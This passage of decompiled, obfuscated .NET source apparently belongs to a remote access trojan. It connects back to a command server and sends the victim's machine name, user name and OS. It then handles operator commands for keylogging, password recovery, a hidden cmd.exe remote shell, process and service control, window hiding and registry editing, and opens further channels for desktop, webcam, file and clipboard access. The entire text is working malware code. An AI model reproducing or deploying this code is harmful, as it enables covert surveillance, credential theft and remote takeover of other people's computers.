					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/KEYSLOGG/":
					try
					{
						Thread thread3 = new Thread(method_14);
						thread3.Start(false);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/KEYSLOGR/":
					try
					{
						Thread thread2 = new Thread(method_14);
						thread2.Start(true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/INSTALLK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(method_13);
						thread.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						streamWriter_0.WriteLine("/KEYSLOGG/");
						streamWriter_0.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void method_18()
	{
		string text = null;
		try
		{
			while (tcpClient_3.Connected)
			{
				text = Qy6I0HJ3131.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PSWRECOV/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(Twg4loUFl8uvAeX0O7pHN5Z6143);
						thread.Start(uSsKAchc130);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						streamWriter_1.WriteLine("/TRYPAAAA/");
						streamWriter_1.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void tsyOa3WEyBAU206()
	{
		string text = null;
		try
		{
			while (tcpClient_4.Connected)
			{
				text = cDqKQB1E136.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/LISTPROC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(gMlLfldODNkp161);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/KILLPROC/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(MZmQwZIIkZSc189);
						thread2.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						BQwhZ5yk135.WriteLine("/LISTPROC/");
						BQwhZ5yk135.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void zDOyXRBYD5w5207()
	{
		string text = null;
		try
		{
			while (u4lkk8tJ138.Connected)
			{
				text = DIgfMur9141.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/LISTSERV/":
					try
					{
						Thread thread6 = new Thread(lBUmNqbWdVjc162);
						thread6.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread5 = new Thread(SUDAa528U00c172);
						thread5.Start(text + "¦STOP");
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread4 = new Thread(SUDAa528U00c172);
						thread4.Start(text + "¦START");
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DSBLSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(SUDAa528U00c172);
						thread3.Start(text + "¦DISABLE");
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MNULSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(SUDAa528U00c172);
						thread2.Start(text + "¦MANUAL");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/AUTOSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(SUDAa528U00c172);
						thread.Start(text + "¦AUTO");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						vlD8jjbL140.WriteLine("/LISTSERV/");
						vlD8jjbL140.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void method_19()
	{
		string text = null;
		try
		{
			while (aG4opDl5143.Connected)
			{
				text = streamReader_4.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REFRWIND/":
					try
					{
						Thread thread3 = new Thread(tpprJjB0ulXP0bYvQBhqY2yk150);
						thread3.Start();
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLSEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById7 = Process.GetProcessById(Conversions.ToInteger(text));
						processById7.Kill();
						Thread thread2 = new Thread(tpprJjB0ulXP0bYvQBhqY2yk150);
						thread2.Start();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById6 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById6.MainWindowHandle, 0);
						Thread thread = new Thread(tpprJjB0ulXP0bYvQBhqY2yk150);
						thread.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MINIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById5 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById5.MainWindowHandle, 6);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MAXIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById4 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById4.MainWindowHandle, 3);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RSTRWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById3 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById3.MainWindowHandle, 9);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DFLTWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById2 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById2.MainWindowHandle, 10);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById.MainWindowHandle, 4);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						SAGCSeXb145.WriteLine("/REFRWIND/");
						SAGCSeXb145.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
	}

	private void tkMxnP3wXKMr209()
	{
		string text = null;
		try
		{
			while (ma3dtgm8148.Connected)
			{
				text = fJOejcV5151.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REGYVIEW/":
					try
					{
						switch (Strings.Mid(text, 11, Strings.Len(text)))
						{
						case "CU":
						{
							Thread thread6 = new Thread(LSDSTi1ls8FR165);
							thread6.Start("CU");
							break;
						}
						case "LM":
						{
							Thread thread6 = new Thread(LSDSTi1ls8FR165);
							thread6.Start("LM");
							break;
						}
						case "US":
						{
							Thread thread6 = new Thread(LSDSTi1ls8FR165);
							thread6.Start("US");
							break;
						}
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWS/":
					try
					{
						string text13 = null;
						string text14 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array5 = null;
						array5 = text.Split(new char[1] { '¥' });
						text14 = array5[0];
						text13 = array5[1];
						switch (text14)
						{
						case "CU":
						{
							Thread thread5 = new Thread(JdCck2SlUDAY166);
							thread5.Start(text14 + text13);
							break;
						}
						case "LM":
						{
							Thread thread5 = new Thread(JdCck2SlUDAY166);
							thread5.Start(text14 + text13);
							break;
						}
						case "US":
						{
							Thread thread5 = new Thread(JdCck2SlUDAY166);
							thread5.Start(text14 + text13);
							break;
						}
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWV/":
					try
					{
						string text11 = null;
						string text12 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array4 = null;
						array4 = text.Split(new char[1] { '¥' });
						text12 = array4[0];
						text11 = array4[1];
						switch (text12)
						{
						case "CU":
						{
							Thread thread4 = new Thread(eL615J3jZipJ170);
							thread4.Start(text12 + text11);
							break;
						}
						case "LM":
						{
							Thread thread4 = new Thread(eL615J3jZipJ170);
							thread4.Start(text12 + text11);
							break;
						}
						case "US":
						{
							Thread thread4 = new Thread(eL615J3jZipJ170);
							thread4.Start(text12 + text11);
							break;
						}
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGCREAT/":
					try
					{
						string text8 = null;
						string text9 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array3 = null;
						array3 = text.Split(new char[1] { '¥' });
						text9 = array3[0];
						text8 = array3[1];
						string text10 = array3[2];
						switch (text9)
						{
						case "CU":
						{
							Thread thread3 = new Thread(cu4geq2VOqek167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "LM":
						{
							Thread thread3 = new Thread(cu4geq2VOqek167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "US":
						{
							Thread thread3 = new Thread(cu4geq2VOqek167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGDELET/":
					try
					{
						string text5 = null;
						string text6 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array2 = null;
						array2 = text.Split(new char[1] { '¥' });
						text6 = array2[0];
						text5 = array2[1];
						string text7 = array2[2];
						switch (text6)
						{
						case "CU":
						{
							Thread thread2 = new Thread(NAoeXlND8mWD168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "LM":
						{
							Thread thread2 = new Thread(NAoeXlND8mWD168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "US":
						{
							Thread thread2 = new Thread(NAoeXlND8mWD168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGRENAM/":
					try
					{
						string text2 = null;
						string text3 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array = null;
						array = text.Split(new char[1] { '¥' });
						text3 = array[0];
						text2 = array[1];
						string text4 = array[2];
						switch (text3)
						{
						case "CU":
						{
							Thread thread = new Thread(kty7idg8hEGo169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "LM":
						{
							Thread thread = new Thread(kty7idg8hEGo169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "US":
						{
							Thread thread = new Thread(kty7idg8hEGo169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					ssqwzwagQoOhjET2PiWIbjP3122(1);
					try
					{
						JSnoFpDY150.WriteLine("/REGYVIEW/");
						JSnoFpDY150.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void JEAlnjCoVsNG210()
	{
		string text = null;
		try
		{
			while (FPlPaaKX153.Connected)
			{
				text = HXTQ8tLZ156.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					ssqwzwagQoOhjET2PiWIbjP3122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/STARTCMD/":
					try
					{
						if (!JQyi5FVKM9VhQlBPmed3870F144("cmd"))
						{
							KVoJFWDFFfKr32 = new Process();
							KVoJFWDFFfKr32.StartInfo.FileName = "cmd.exe";
							KVoJFWDFFfKr32.StartInfo.CreateNoWindow = true;
							KVoJFWDFFfKr32.StartInfo.UseShellExecute = false;
							KVoJFWDFFfKr32.StartInfo.RedirectStandardOutput = true;
							KVoJFWDFFfKr32.StartInfo.RedirectStandardInput = true;
							KVoJFWDFFfKr32.StartInfo.RedirectStandardError = true;
							KVoJFWDFFfKr32.OutputDataReceived += KVoJFWDFFfKr32_OutputDataReceived;
							KVoJFWDFFfKr32.Start();
							KVoJFWDFFfKr32.BeginOutputReadLine();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPCMD/":
					try
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.ProcessName.StartsWith("cmd"))
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CMDCMDGO/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						F5XZnjZTjtab33.Append(text);
						F5XZnjZTjtab33.Append("\r\n");
						KVoJFWDFFfKr32.StandardInput.WriteLine((object?)F5XZnjZTjtab33);
						F5XZnjZTjtab33.Remove(0, F5XZnjZTjtab33.Length);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void KQD4vvfAQi4C211()
	{
		checked
		{
			while (true)
			{
				ZFKvgVNVtmCx15 = 0;
				F5XZnjZTjtab33 = new StringBuilder();
				tcpClient_0 = new TcpClient();
				int delayInSeconds = HPuVLdBNxalvPBAFcKJqiGas145(5, 25);
				ssqwzwagQoOhjET2PiWIbjP3122(delayInSeconds);
				string text = null;
				string text2 = null;
				try
				{
					if (dNFIImscZJio191(d69lkGihXg4v23))
					{
						text = d69lkGihXg4v23;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(d69lkGihXg4v23);
						if (hostAddresses.Length > 1)
						{
							text = hostAddresses[0].ToString();
							try
							{
								if (!dNFIImscZJio191(text))
								{
									text = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								text = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (dNFIImscZJio191(iIKPQknv5iLz24))
					{
						text2 = iIKPQknv5iLz24;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(iIKPQknv5iLz24);
						if (hostAddresses.Length > 1)
						{
							text2 = hostAddresses[0].ToString();
							try
							{
								if (!dNFIImscZJio191(text2))
								{
									text2 = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								text2 = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text2 = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					tcpClient_0.Connect(text, int_1);
					pk6bwBU7Ll5C29 = tcpClient_0.GetStream();
					streamReader_0 = new StreamReader(pk6bwBU7Ll5C29);
					H7Dh6pvsTw1D30 = new StreamWriter(pk6bwBU7Ll5C29);
					ZFKvgVNVtmCx15 = 0;
					string_4 = text;
					yYxuvHumdHoJcejw178 = int_1;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					try
					{
						try
						{
							tcpClient_0.Connect(text, rNNz8R7UlA3o27);
							pk6bwBU7Ll5C29 = tcpClient_0.GetStream();
							streamReader_0 = new StreamReader(pk6bwBU7Ll5C29);
							H7Dh6pvsTw1D30 = new StreamWriter(pk6bwBU7Ll5C29);
							ZFKvgVNVtmCx15 = 0;
							string_4 = text;
							yYxuvHumdHoJcejw178 = rNNz8R7UlA3o27;
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							try
							{
								tcpClient_0.Connect(text2, int_1);
								pk6bwBU7Ll5C29 = tcpClient_0.GetStream();
								streamReader_0 = new StreamReader(pk6bwBU7Ll5C29);
								H7Dh6pvsTw1D30 = new StreamWriter(pk6bwBU7Ll5C29);
								ZFKvgVNVtmCx15 = 0;
								string_4 = text2;
								yYxuvHumdHoJcejw178 = int_1;
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								try
								{
									tcpClient_0.Connect(text2, rNNz8R7UlA3o27);
									pk6bwBU7Ll5C29 = tcpClient_0.GetStream();
									streamReader_0 = new StreamReader(pk6bwBU7Ll5C29);
									H7Dh6pvsTw1D30 = new StreamWriter(pk6bwBU7Ll5C29);
									ZFKvgVNVtmCx15 = 0;
									string_4 = text2;
									yYxuvHumdHoJcejw178 = rNNz8R7UlA3o27;
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									qrkOw7laVvfcWcEpom74OXj5130();
									Thread.Sleep(100);
									ProjectData.ClearProjectError();
									continue;
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					ProjectData.ClearProjectError();
				}
				ssqwzwagQoOhjET2PiWIbjP3122(1);
				try
				{
					string text3 = "Client" + Conversions.ToString(HPuVLdBNxalvPBAFcKJqiGas145(1, 99999));
					try
					{
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)null, false))
						{
							((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text3, RegistryValueKind.String);
						}
						else
						{
							text3 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"));
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					if ((Operators.CompareString(text3, (string)null, false) == 0) | (text3.Length < 2))
					{
						text3 = "Client" + Conversions.ToString(HPuVLdBNxalvPBAFcKJqiGas145(1, 99999));
					}
					StreamWriter h7Dh6pvsTw1D = H7Dh6pvsTw1D30;
					string[] array = new string[12]
					{
						"/TRYFIRST/",
						text3,
						"*",
						((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Name(),
						"*",
						Environment.UserName,
						"*",
						((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Info().get_OSFullName(),
						"*3.6*",
						null,
						null,
						null
					};
					string[] array2 = array;
					string lpszName = "";
					string lpszVer = "";
					array2[9] = Conversions.ToString(capGetDriverDescriptionA(0, ref lpszName, 0, ref lpszVer, 0));
					array[10] = "*";
					array[11] = method_1();
					h7Dh6pvsTw1D.WriteLine(string.Concat(array));
					H7Dh6pvsTw1D30.Flush();
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				while (tcpClient_0.Connected)
				{
					try
					{
						string text4 = streamReader_0.ReadLine();
						switch (Strings.Left(text4, 10))
						{
						case "/TRYTRYDK/":
							idgAPcRt68 = new TcpClient();
							idgAPcRt68.Connect(string_4, yYxuvHumdHoJcejw178);
							RlTBiBnU69 = idgAPcRt68.GetStream();
							streamReader_1 = new StreamReader(RlTBiBnU69);
							gmvd9wR170 = new StreamWriter(RlTBiBnU69);
							HjFVSDhb72 = new Thread(unBpN3AttLxf192);
							HjFVSDhb72.Start();
							gmvd9wR170.WriteLine("/TRYDESKK/");
							gmvd9wR170.Flush();
							continue;
						case "/TRYTRYWB/":
							DZYDaHEu73 = new TcpClient();
							DZYDaHEu73.Connect(string_4, yYxuvHumdHoJcejw178);
							Rl4yTP1M74 = DZYDaHEu73.GetStream();
							cOUZWr2D76 = new StreamReader(Rl4yTP1M74);
							mfw1bmIe75 = new StreamWriter(Rl4yTP1M74);
							thread_1 = new Thread(oAyTSL7XC4DJ193);
							thread_1.Start();
							mfw1bmIe75.WriteLine("/TRYWEBBB/");
							mfw1bmIe75.Flush();
							continue;
						case "/TRYTRYFM/":
							tcpClient_1 = new TcpClient();
							tcpClient_1.Connect(string_4, yYxuvHumdHoJcejw178);
							hTyD6f0g79 = tcpClient_1.GetStream();
							jrsygRe881 = new StreamReader(hTyD6f0g79);
							gJrlNEyq80 = new StreamWriter(hTyD6f0g79);
							o8REKjGB82 = new Thread(j0ZXxFcD07Fe194);
							o8REKjGB82.Start();
							gJrlNEyq80.WriteLine("/TRYFMMMM/");
							gJrlNEyq80.Flush();
							continue;
						case "/TRYTRYIN/":
							D2I3SpwP83 = new TcpClient();
							D2I3SpwP83.Connect(string_4, yYxuvHumdHoJcejw178);
							jjTNLvzv84 = D2I3SpwP83.GetStream();
							EqeYolvW86 = new StreamReader(jjTNLvzv84);
							Yc568CBp85 = new StreamWriter(jjTNLvzv84);
							thread_2 = new Thread(OzjeClMqKR5N196);
							thread_2.Start();
							Yc568CBp85.WriteLine("/TRYINFOO/");
							Yc568CBp85.Flush();
							continue;
						case "/TRYTRYMS/":
							UDfXYqnS88 = new TcpClient();
							UDfXYqnS88.Connect(string_4, yYxuvHumdHoJcejw178);
							ymGyeAs089 = UDfXYqnS88.GetStream();
							NXKVNPzt91 = new StreamReader(ymGyeAs089);
							riosayrY90 = new StreamWriter(ymGyeAs089);
							EbcvnDre92 = new Thread(method_16);
							EbcvnDre92.Start();
							riosayrY90.WriteLine("/TRYMSGGG/");
							riosayrY90.Flush();
							continue;
						case "/TRYTRYFN/":
							tcpClient_2 = new TcpClient();
							tcpClient_2.Connect(string_4, yYxuvHumdHoJcejw178);
							nHjD64Jl94 = tcpClient_2.GetStream();
							MdT3nXDN96 = new StreamReader(nHjD64Jl94);
							bga0Fr5J95 = new StreamWriter(nHjD64Jl94);
							RapN9pjQ97 = new Thread(SPIKebtTGR9X198);
							RapN9pjQ97.Start();
							bga0Fr5J95.WriteLine("/TRYFUNNN/");
							bga0Fr5J95.Flush();
							continue;
						case "/TRYTRYIE/":
							fhy5vVmA98 = new TcpClient();
							fhy5vVmA98.Connect(string_4, yYxuvHumdHoJcejw178);
							rQj6tqyB99 = fhy5vVmA98.GetStream();
							streamReader_2 = new StreamReader(rQj6tqyB99);
							gFfr3E5p100 = new StreamWriter(rQj6tqyB99);
							XjLnT0eQ102 = new Thread(lY1ElfuCs5eC199);
							XjLnT0eQ102.Start();
							gFfr3E5p100.WriteLine("/TRYIEEEE/");
							gFfr3E5p100.Flush();
							continue;
						case "/TRYTRYCL/":
							QjBxDwjq103 = new TcpClient();
							QjBxDwjq103.Connect(string_4, yYxuvHumdHoJcejw178);
							BOwu9RMA104 = QjBxDwjq103.GetStream();
							Ex99EbIg106 = new StreamReader(BOwu9RMA104);
							c80Z9pWv105 = new StreamWriter(BOwu9RMA104);
							roBK2yLy107 = new Thread(V2Tmb2du9YlN200);
							roBK2yLy107.Start();
							c80Z9pWv105.WriteLine("/TRYCLIPP/");
							c80Z9pWv105.Flush();
							continue;
						case "/TRYTRYRD/":
							cllQpIC5108 = new TcpClient();
							cllQpIC5108.Connect(string_4, yYxuvHumdHoJcejw178);
							xbbKZeHq109 = cllQpIC5108.GetStream();
							streamReader_3 = new StreamReader(xbbKZeHq109);
							n6T6m9Lp110 = new StreamWriter(xbbKZeHq109);
							msMN456W112 = new Thread(D1bynb6ctYrz201);
							msMN456W112.Start();
							n6T6m9Lp110.WriteLine("/TRYRDDDD/");
							n6T6m9Lp110.Flush();
							continue;
						case "/TRYTRYPM/":
							V4Ct0Xhc113 = new TcpClient();
							V4Ct0Xhc113.Connect(string_4, yYxuvHumdHoJcejw178);
							HanWFFb2114 = V4Ct0Xhc113.GetStream();
							EwowrTmh116 = new StreamReader(HanWFFb2114);
							AVK9ERPu115 = new StreamWriter(HanWFFb2114);
							thread_3 = new Thread(SzVEPNTNA6Oc202);
							thread_3.Start();
							AVK9ERPu115.WriteLine("/TRYPMMMM/");
							AVK9ERPu115.Flush();
							continue;
						case "/TRYTRYSF/":
							YQ35FAZG118 = new TcpClient();
							YQ35FAZG118.Connect(string_4, yYxuvHumdHoJcejw178);
							gKd8lWh3119 = YQ35FAZG118.GetStream();
							O5VIuTvh121 = new StreamReader(gKd8lWh3119);
							e7OtzKKO120 = new StreamWriter(gKd8lWh3119);
							vCaNNJP3122 = new Thread(h7HEEFOnDd1j203);
							vCaNNJP3122.Start();
							e7OtzKKO120.WriteLine("/TRYSFFFF/");
							e7OtzKKO120.Flush();
							continue;
						case "/TRYTRYLG/":
							xHgHFdV3123 = new TcpClient();
							xHgHFdV3123.Connect(string_4, yYxuvHumdHoJcejw178);
							F73ptWze124 = xHgHFdV3123.GetStream();
							eVDJMtgv126 = new StreamReader(F73ptWze124);
							streamWriter_0 = new StreamWriter(F73ptWze124);
							iLVRu28A127 = new Thread(method_17);
							iLVRu28A127.Start();
							streamWriter_0.WriteLine("/TRYKEYYY/");
							streamWriter_0.Flush();
							continue;
						case "/TRYTRYPS/":
							tcpClient_3 = new TcpClient();
							tcpClient_3.Connect(string_4, yYxuvHumdHoJcejw178);
							networkStream_0 = tcpClient_3.GetStream();
							Qy6I0HJ3131 = new StreamReader(networkStream_0);
							uSsKAchc130 = new StreamWriter(networkStream_0);
							thread_4 = new Thread(method_18);
							thread_4.Start();
							uSsKAchc130.WriteLine("/TRYPASSS/");
							uSsKAchc130.Flush();
							continue;
						case "/TRYTRYPR/":
							tcpClient_4 = new TcpClient();
							tcpClient_4.Connect(string_4, yYxuvHumdHoJcejw178);
							mFmBzo0X134 = tcpClient_4.GetStream();
							cDqKQB1E136 = new StreamReader(mFmBzo0X134);
							BQwhZ5yk135 = new StreamWriter(mFmBzo0X134);
							lkBwwrq7137 = new Thread(tsyOa3WEyBAU206);
							lkBwwrq7137.Start();
							BQwhZ5yk135.WriteLine("/TRYPROCC/");
							BQwhZ5yk135.Flush();
							continue;
						case "/TRYTRYSE/":
							u4lkk8tJ138 = new TcpClient();
